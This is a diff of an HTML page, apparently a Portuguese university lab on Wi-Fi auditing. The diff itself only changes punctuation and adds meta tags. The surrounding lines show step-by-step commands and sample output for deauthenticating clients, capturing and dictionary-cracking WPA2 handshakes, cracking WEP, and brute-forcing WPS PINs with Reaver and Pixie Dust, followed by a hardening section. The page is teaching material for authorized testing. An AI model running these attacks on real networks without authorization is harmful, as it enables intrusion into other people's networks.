@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="author" content="Prof. Dr. Laerte Peotta de Melo">
 <meta name="description" content="Laboratório prático de segurança em redes Wi-Fi com Kismet, Aircrack-ng, Reaver e Wifite. Material educacional para pentests autorizados, com ambientes Kali Linux ou Parrot OS.">
-<title>Lab 05 — Ferramentas de Auditoria | Prof. Dr. Laerte Peotta de Melo</title>
+<title>Lab 05 - Ferramentas de Auditoria | Prof. Dr. Laerte Peotta de Melo</title>
 <style>
 
   :root{
@@ -565,6 +565,12 @@
   }
 
 </style>
+  <link rel="canonical" href="https://peotta.github.io/labs/lab05-ferramentas.html">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Lab 05 - Ferramentas de Auditoria | Prof. Dr. Laerte Peotta de Melo">
+  <meta property="og:description" content="Laboratório prático de segurança em redes Wi-Fi com Kismet, Aircrack-ng, Reaver e Wifite. Material educacional para pentests autorizados, com ambientes Kali Linux ou Parrot OS.">
+  <meta property="og:url" content="https://peotta.github.io/labs/lab05-ferramentas.html">
+  <meta property="og:image" content="https://peotta.github.io/assets/img/foto-perfil-og.jpg">
 </head>
 <body>
 <canvas id="matrix-rain" aria-hidden="true"></canvas>
@@ -627,16 +633,16 @@
     <h2>Sumário</h2>
     <ol>
       <li><a href="#setup">Configuração do ambiente</a></li>
-      <li><a href="#kismet">Kismet — reconhecimento passivo</a></li>
-      <li><a href="#aircrack">Aircrack-ng — captura e análise</a></li>
-      <li><a href="#reaver">Reaver — ataque ao WPS PIN</a></li>
-      <li><a href="#wifite">Wifite — automação completa</a></li>
+      <li><a href="#kismet">Kismet - reconhecimento passivo</a></li>
+      <li><a href="#aircrack">Aircrack-ng - captura e análise</a></li>
+      <li><a href="#reaver">Reaver - ataque ao WPS PIN</a></li>
+      <li><a href="#wifite">Wifite - automação completa</a></li>
       <li><a href="#defesa">Hardening e defesa</a></li>
     </ol>
   </div>
 
   <!-- ══════════════════════════════════════════
-       SEÇÃO 1 — SETUP
+       SEÇÃO 1 - SETUP
   ══════════════════════════════════════════ -->
   <section id="setup">
     <h2>1. Configuração do ambiente</h2>
@@ -644,7 +650,7 @@
     <p>
       O laboratório utiliza <strong>Kali Linux ou Parrot OS Security</strong>, ambientes amplamente usados em auditoria de segurança e forense digital. Em ambos os casos, valide a disponibilidade das ferramentas e mantenha o sistema atualizado.
       O adaptador wireless USB deve suportar <strong>Monitor Mode</strong> e <strong>Packet Injection</strong>
-      — requisitos obrigatórios para captura ativa e passiva.
+      - requisitos obrigatórios para captura ativa e passiva.
     </p>
 
     <h3>Hardware recomendado</h3>
@@ -652,10 +658,10 @@
       <table>
         <tr><th>Componente</th><th>Recomendação</th><th>Observação</th></tr>
         <tr><td>Distribuição Linux</td><td><a href="https://www.kali.org/" target="_blank" rel="noreferrer">Kali Linux</a> • <a href="https://parrotsec.org/" target="_blank" rel="noreferrer">Parrot OS Security</a></td><td>Use sempre ambiente controlado, atualizado e autorizado.</td></tr>
-        <tr><td>RTL8812AU — Realtek</td><td>ALFA AWUS036ACH</td><td>Dual-band 2.4 GHz / 5 GHz; muito usado em auditorias pela estabilidade em modo monitor e injeção de pacotes.</td></tr>
-        <tr><td>MT7612U — MediaTek</td><td>ALFA AWUS036ACM ou Comfast CF-WU785AC</td><td>Boa compatibilidade nativa em kernels Linux recentes; opção moderna e estável.</td></tr>
-        <tr><td>AR9271 — Atheros</td><td>TP-Link TL-WN722N versão 1 ou adaptadores genéricos AR9271</td><td>Chipset clássico e muito estável; limitado à banda de 2.4 GHz.</td></tr>
-        <tr><td>RT3070 — Ralink</td><td>ALFA AWUS036NH ou compatíveis</td><td>Opção clássica 2.4 GHz, geralmente plug-and-play em várias distribuições Linux.</td></tr>
+        <tr><td>RTL8812AU - Realtek</td><td>ALFA AWUS036ACH</td><td>Dual-band 2.4 GHz / 5 GHz; muito usado em auditorias pela estabilidade em modo monitor e injeção de pacotes.</td></tr>
+        <tr><td>MT7612U - MediaTek</td><td>ALFA AWUS036ACM ou Comfast CF-WU785AC</td><td>Boa compatibilidade nativa em kernels Linux recentes; opção moderna e estável.</td></tr>
+        <tr><td>AR9271 - Atheros</td><td>TP-Link TL-WN722N versão 1 ou adaptadores genéricos AR9271</td><td>Chipset clássico e muito estável; limitado à banda de 2.4 GHz.</td></tr>
+        <tr><td>RT3070 - Ralink</td><td>ALFA AWUS036NH ou compatíveis</td><td>Opção clássica 2.4 GHz, geralmente plug-and-play em várias distribuições Linux.</td></tr>
       </table>
     </div>
 
@@ -717,10 +723,10 @@ iwconfig wlan0
   </section>
 
   <!-- ══════════════════════════════════════════
-       SEÇÃO 2 — KISMET
+       SEÇÃO 2 - KISMET
   ══════════════════════════════════════════ -->
   <section id="kismet">
-    <h2>2. Kismet — reconhecimento passivo</h2>
+    <h2>2. Kismet - reconhecimento passivo</h2>
 
     <p>
       Kismet é um sniffer e IDS wireless que opera em modo <strong>exclusivamente passivo</strong>:
@@ -767,17 +773,17 @@ kismet -c wlan0 --alert DEAUTHFLOOD,5,1 --alert APSPOOF,10,60
         Origem: AA:BB:CC:11:22:33 → 5 frames em 1 segundo</span></code></pre>
 
     <div class="badge-row" style="margin-top:1rem">
-      <span class="badge badge-green">passivo — stealth total</span>
+      <span class="badge badge-green">passivo - stealth total</span>
       <span class="badge badge-blue">detecta WEP / WPA / WPA2 / WPA3</span>
       <span class="badge badge-blue">mapeia clientes e APs</span>
     </div>
   </section>
 
   <!-- ══════════════════════════════════════════
-       SEÇÃO 3 — AIRCRACK-NG
+       SEÇÃO 3 - AIRCRACK-NG
   ══════════════════════════════════════════ -->
   <section id="aircrack">
-    <h2>3. Aircrack-ng — captura e análise</h2>
+    <h2>3. Aircrack-ng - captura e análise</h2>
 
     <p>
       O conjunto Aircrack-ng é a suite mais completa para auditoria de redes Wi-Fi.
@@ -801,7 +807,7 @@ kismet -c wlan0 --alert DEAUTHFLOOD,5,1 --alert APSPOOF,10,60
       </table>
     </div>
 
-    <h3>Passo 1 — ativar monitor mode</h3>
+    <h3>Passo 1 - ativar monitor mode</h3>
     <pre><code><span class="cm"># Encerrar processos que conflitam com o monitor mode</span>
 airmon-ng check kill
 
@@ -811,7 +817,7 @@ airmon-ng start wlan0
 <span class="cs">✓ Processos encerrados: NetworkManager, wpa_supplicant
 ✓ Interface de monitor criada: wlan0mon</span></code></pre>
 
-    <h3>Passo 2 — escanear redes</h3>
+    <h3>Passo 2 - escanear redes</h3>
     <pre><code><span class="cm"># Escanear bandas 2.4 GHz e 5 GHz e salvar captura</span>
 airodump-ng wlan0mon --band abg -w captura --output-format pcap
 
@@ -820,7 +826,7 @@ airodump-ng wlan0mon --band abg -w captura --output-format pcap
  AA:BB:CC:44:55:66  36  -55  WPA3   LabRouter</span>
 <span class="cw"> AA:BB:CC:77:88:99   1  -78  WEP    OldRouter     ← crack em minutos</span></code></pre>
 
-    <h3>Passo 3 — capturar handshake WPA2</h3>
+    <h3>Passo 3 - capturar handshake WPA2</h3>
     <pre><code><span class="cm"># Focar em canal e BSSID do alvo</span>
 airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w handshake wlan0mon
 
@@ -830,7 +836,7 @@ aireplay-ng -0 5 -a AA:BB:CC:11:22:33 -c DD:EE:FF:00:11:22 wlan0mon
 <span class="cw">Enviando 5 frames de DeAuth direcionados...</span>
 <span class="cs">WPA handshake: AA:BB:CC:11:22:33  ← capturado com sucesso</span></code></pre>
 
-    <h3>Passo 4 — tentativa de recuperação da chave por dicionário</h3>
+    <h3>Passo 4 - tentativa de recuperação da chave por dicionário</h3>
     <pre><code><span class="cm"># Testar senhas do wordlist rockyou contra o handshake capturado</span>
 aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
 
@@ -838,7 +844,7 @@ aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
 <span class="cs">KEY FOUND! [ senha123 ]
 Tempo decorrido: 4m 23s  |  Velocidade: 54.521 chaves/s</span></code></pre>
 
-    <h3>WEP — crack direto (protocolo obsoleto)</h3>
+    <h3>WEP - crack direto (protocolo obsoleto)</h3>
     <pre><code><span class="cm"># Coletar IVs via ataque de reinjeção ARP</span>
 aireplay-ng -3 -b AA:BB:CC:77:88:99 wlan0mon
 
@@ -846,17 +852,17 @@ aireplay-ng -3 -b AA:BB:CC:77:88:99 wlan0mon
 aircrack-ng -b AA:BB:CC:77:88:99 captura-01.cap
 
 <span class="cs">KEY FOUND! [ 1A:2B:3C:4D:5E ]</span>
-<span class="cm"># WEP é quebrado em minutos — nunca utilize este protocolo</span></code></pre>
+<span class="cm"># WEP é quebrado em minutos - nunca utilize este protocolo</span></code></pre>
 
     <h3>Restaurar interface ao modo gerenciado</h3>
     <pre><code>airmon-ng stop wlan0mon && service NetworkManager restart</code></pre>
   </section>
 
   <!-- ══════════════════════════════════════════
-       SEÇÃO 4 — REAVER
+       SEÇÃO 4 - REAVER
   ══════════════════════════════════════════ -->
   <section id="reaver">
-    <h2>4. Reaver — ataque ao WPS PIN</h2>
+    <h2>4. Reaver - ataque ao WPS PIN</h2>
 
     <p>
       O WPS (Wi-Fi Protected Setup) possui uma vulnerabilidade de design documentada: o PIN de
@@ -865,7 +871,7 @@ aircrack-ng -b AA:BB:CC:77:88:99 captura-01.cap
       Roteadores com WPS ativo são, portanto, suscetíveis a ataques de força bruta.
     </p>
 
-    <h3>Passo 1 — verificar roteadores com WPS ativo</h3>
+    <h3>Passo 1 - verificar roteadores com WPS ativo</h3>
     <pre><code><span class="cm"># Listar APs com WPS e status de bloqueio</span>
 wash -i wlan0mon --ignore-fcs
 
@@ -873,17 +879,17 @@ wash -i wlan0mon --ignore-fcs
 <span class="cs"> AA:BB:CC:11:22:33   6  -62  2.0  No   TargetRouter   ← WPS ativo e desbloqueado</span>
 <span class="cw"> AA:BB:CC:44:55:66  36  -55  2.0  Yes  LabRouter      ← WPS bloqueado após tentativas</span></code></pre>
 
-    <h3>Passo 2 — brute-force do PIN WPS</h3>
+    <h3>Passo 2 - brute-force do PIN WPS</h3>
     <pre><code><span class="cm"># -vv = verbose | --delay = pausa entre tentativas para evitar lockout</span>
 reaver -i wlan0mon -b AA:BB:CC:11:22:33 -vv --delay 1 --no-associate
 
 <span class="cs">[+] Tentando PIN 12345670
 [+] Tentando PIN 00005678</span>
-<span class="cw">[!] Rate limiting detectado — aumentando delay para 5s...</span>
+<span class="cw">[!] Rate limiting detectado - aumentando delay para 5s...</span>
 <span class="cs">[+] WPS PIN: '87654321'
 [+] WPA PSK: 'MinhaRedeFibra2024'</span></code></pre>
 
-    <h3>Passo 3 — Pixie Dust attack (ataque offline, muito mais rápido)</h3>
+    <h3>Passo 3 - Pixie Dust attack (ataque offline, muito mais rápido)</h3>
     <p>
       O ataque Pixie Dust explora a geração fraca de nonces aleatórios em chips vulneráveis
       (Ralink, Broadcom, Realtek antigos). Em vez de testar PINs sequencialmente, a chave é
@@ -899,7 +905,7 @@ reaver -i wlan0mon -b AA:BB:CC:11:22:33 -vv -K 1
     <div class="table-wrap">
       <table>
         <tr><th>Método</th><th>Tempo estimado</th><th>Requisito</th></tr>
-        <tr><td>Brute-force PIN</td><td>2–10 horas</td><td>WPS ativo, sem lockout</td></tr>
+        <tr><td>Brute-force PIN</td><td>2-10 horas</td><td>WPS ativo, sem lockout</td></tr>
         <tr><td>Pixie Dust</td><td>Segundos a minutos</td><td>Chip vulnerável (Ralink, Broadcom antigo)</td></tr>
       </table>
     </div>
@@ -911,10 +917,10 @@ reaver -i wlan0mon -b AA:BB:CC:11:22:33 -vv -K 1
   </section>
 
   <!-- ══════════════════════════════════════════
-       SEÇÃO 5 — WIFITE
+       SEÇÃO 5 - WIFITE
   ══════════════════════════════════════════ -->
   <section id="wifite">
-    <h2>5. Wifite — automação completa</h2>
+    <h2>5. Wifite - automação completa</h2>
 
     <p>
       Wifite orquestra automaticamente as ferramentas da suite Aircrack-ng e o Reaver,
@@ -965,9 +971,9 @@ Velocidade: 2.1 MH/s  (RTX 3080)</span></code></pre>
     <div class="table-wrap">
       <table>
         <tr><th>Método</th><th>Velocidade aproximada</th><th>Observação</th></tr>
-        <tr><td>aircrack-ng (CPU)</td><td>50–200 mil chaves/s</td><td>Depende do processador</td></tr>
-        <tr><td>hashcat (GPU mid-range)</td><td>500 mil – 2 M chaves/s</td><td>RTX 3060 ou superior</td></tr>
-        <tr><td>hashcat (GPU high-end)</td><td>2–5 M chaves/s</td><td>RTX 3080/4080</td></tr>
+        <tr><td>aircrack-ng (CPU)</td><td>50-200 mil chaves/s</td><td>Depende do processador</td></tr>
+        <tr><td>hashcat (GPU mid-range)</td><td>500 mil - 2 M chaves/s</td><td>RTX 3060 ou superior</td></tr>
+        <tr><td>hashcat (GPU high-end)</td><td>2-5 M chaves/s</td><td>RTX 3080/4080</td></tr>
       </table>
     </div>
 
@@ -979,7 +985,7 @@ Velocidade: 2.1 MH/s  (RTX 3080)</span></code></pre>
   </section>
 
   <!-- ══════════════════════════════════════════
-       SEÇÃO 6 — DEFESA
+       SEÇÃO 6 - DEFESA
   ══════════════════════════════════════════ -->
   <section id="defesa">
     <h2>6. Hardening e defesa</h2>
@@ -999,7 +1005,7 @@ Velocidade: 2.1 MH/s  (RTX 3080)</span></code></pre>
       <li><span class="ok">✓</span><span><strong>Atualizar o firmware</strong> do roteador regularmente para corrigir vulnerabilidades conhecidas.</span></li>
       <li><span class="ok">✓</span><span>Monitorar a própria rede com Kismet configurado como <strong>IDS</strong> para detectar ataques e rogue APs.</span></li>
       <li><span class="nao">✗</span><span>Evitar senhas baseadas em nome da rede, endereço residencial, data ou nome de pessoa.</span></li>
-      <li><span class="nao">✗</span><span>Evitar acumular redes salvas no dispositivo — probe requests revelam histórico de conexões.</span></li>
+      <li><span class="nao">✗</span><span>Evitar acumular redes salvas no dispositivo - probe requests revelam histórico de conexões.</span></li>
       <li><span class="nao">✗</span><span>Não manter redes abertas sem autenticação em ambientes com dados sensíveis.</span></li>
     </ul>
 
@@ -1022,8 +1028,8 @@ echo -n "SuaSenha123" | sha1sum | cut -c1-5
     <div class="table-wrap">
       <table>
         <tr><th>Protocolo</th><th>Ano</th><th>Criptografia</th><th>Situação</th></tr>
-        <tr><td>WEP</td><td>1997</td><td>RC4 (quebrado)</td><td><strong style="color:#b91c1c">Obsoleto — nunca use</strong></td></tr>
-        <tr><td>WPA</td><td>2003</td><td>TKIP (fraco)</td><td><strong style="color:#b91c1c">Obsoleto — nunca use</strong></td></tr>
+        <tr><td>WEP</td><td>1997</td><td>RC4 (quebrado)</td><td><strong style="color:#b91c1c">Obsoleto - nunca use</strong></td></tr>
+        <tr><td>WPA</td><td>2003</td><td>TKIP (fraco)</td><td><strong style="color:#b91c1c">Obsoleto - nunca use</strong></td></tr>
         <tr><td>WPA2-TKIP</td><td>2004</td><td>TKIP (fraco)</td><td><strong style="color:#953800">Evitar</strong></td></tr>
         <tr><td>WPA2-AES</td><td>2004</td><td>AES-CCMP 128 bits</td><td><strong style="color:#1e6e3c">Aceitável</strong></td></tr>
         <tr><td>WPA3-Personal</td><td>2018</td><td>AES-CCMP 128 bits + SAE</td><td><strong style="color:#1e6e3c">Recomendado</strong></td></tr>
@@ -1035,13 +1041,13 @@ echo -n "SuaSenha123" | sha1sum | cut -c1-5
     <div class="link-grid">
       <div class="link-card">
         <div class="lc-label">Certificação</div>
-        <div class="lc-title">CEH — EC-Council</div>
+        <div class="lc-title">CEH - EC-Council</div>
         <div class="lc-desc">Certified Ethical Hacker. Cobre extensivamente pentest Wi-Fi.</div>
         <a class="lc-link" href="https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/" target="_blank">ec-council.org ↗</a>
       </div>
       <div class="link-card">
         <div class="lc-label">Certificação</div>
-        <div class="lc-title">eJPT — eLearnSecurity</div>
+        <div class="lc-title">eJPT - eLearnSecurity</div>
         <div class="lc-desc">Entry-level. Inclui módulo de segurança wireless.</div>
         <a class="lc-link" href="https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester-cert" target="_blank">ine.com ↗</a>
       </div>
@@ -1083,7 +1089,7 @@ echo -n "SuaSenha123" | sha1sum | cut -c1-5
       </div>
       <div class="link-card">
         <div class="lc-label">Lab Anterior</div>
-        <div class="lc-title">Lab 04 — Ataques e Contramedidas</div>
+        <div class="lc-title">Lab 04 - Ataques e Contramedidas</div>
         <div class="lc-desc">DeAuth, Evil Twin, WPS e contramedidas práticas no ambiente isolado.</div>
         <a class="lc-link" href="lab04-ataques.html">← Voltar</a>
       </div>
